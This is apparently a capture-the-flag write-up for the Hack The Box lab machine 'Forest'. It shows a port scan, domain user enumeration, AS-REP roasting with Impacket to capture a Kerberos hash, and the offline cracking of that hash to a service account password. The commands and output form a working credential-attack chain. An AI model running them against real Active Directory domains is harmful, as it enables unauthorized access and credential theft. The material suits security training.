# Forest

```sql
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 13:52 EDT
Nmap scan report for 10.10.10.161
Host is up (0.058s latency).
Not shown: 991 closed ports
PORT    STATE SERVICE      VERSION
53/tcp  open  domain       Simple DNS Plus
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-04 18:00:54Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp open  kpasswd5?
593/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m47s, deviation: 4h02m30s, median: 7m46s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST                                                                                                                                                                                                                  
|   NetBIOS computer name: FOREST\x00                                                                                                                                                                                                      
|   Domain name: htb.local                                                                                                                                                                                                                 
|   Forest name: htb.local                                                                                                                                                                                                                 
|   FQDN: FOREST.htb.local                                                                                                                                                                                                                 
|_  System time: 2021-04-04T11:01:00-07:00                                                                                                                                                                                                 
| smb-security-mode:                                                                                                                                                                                                                       
|   account_used: <blank>                                                                                                                                                                                                                  
|   authentication_level: user                                                                                                                                                                                                             
|   challenge_response: supported                                                                                                                                                                                                          
|_  message_signing: required                                                                                                                                                                                                              
| smb2-security-mode:                                                                                                                                                                                                                      
|   2.02:                                                                                                                                                                                                                                  
|_    Message signing enabled and required                                                                                                                                                                                                 
| smb2-time:                                                                                                                                                                                                                               
|   date: 2021-04-04T18:01:03                                                                                                                                                                                                              
|_  start_date: 2021-04-04T18:00:11                                                                                                                
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                             
Nmap done: 1 IP address (1 host up) scanned in 33.14 seconds                        
```


As it is SMB protocole running, we start enum4linux to gather as much informations as possible

## Enum4linux

```sql
enum4linux -U -S 10.10.10.161 
```

We found several users 
```sql
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

## Impacket

```bash
python3 /opt/impacket/examples/GetNPUsers.py  -usersfile login.txt -format hashcat -outputfile forest.txt -dc-ip 10.10.10.161 htb.local/ -no-pass
```
```bash
┌──(kali㉿kali)-[~/Documents/htb/forest]
└─$ cat forest.txt   
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2799a095ae6cf93f279f87de33867228$72db58c619f371332f355c039e97fa45880edb1fd7d39421c46836e9d1d4cc18983c172650d89f245c70cde5039afde86d1403b7ec7241f808a722e0103833493130f17d12e8fabc01b248212db5cedb2046d116940658bc0c1e29da81bb6f1003562b94fad03027071f80f3d7d49a4c469810c49a696b526faf7c0d6b03ab96aec763af22f887cc43d92435f2d33b3ff9e5ae634f8de15aad7eed82f4c376e4eeaa572bfc4aa8d857cddb864a6d8de620fca559f8258bf105eab63c6e4b32d211f6d061b7e64f3417a0effb6e991efd7d036b0860125aac69eecafe902d4621e96d911c363b
```
We got the hash of a user so let's decrypt with john

## John
```bash
┌──(kali㉿kali)-[~/Documents/htb/forest]
└─$ john forjohn --wordlist=/opt/SecLists/Passwords/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          (?)
1g 0:00:00:05 DONE (2021-04-05 06:26) 0.1808g/s 738835p/s 738835c/s 738835C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```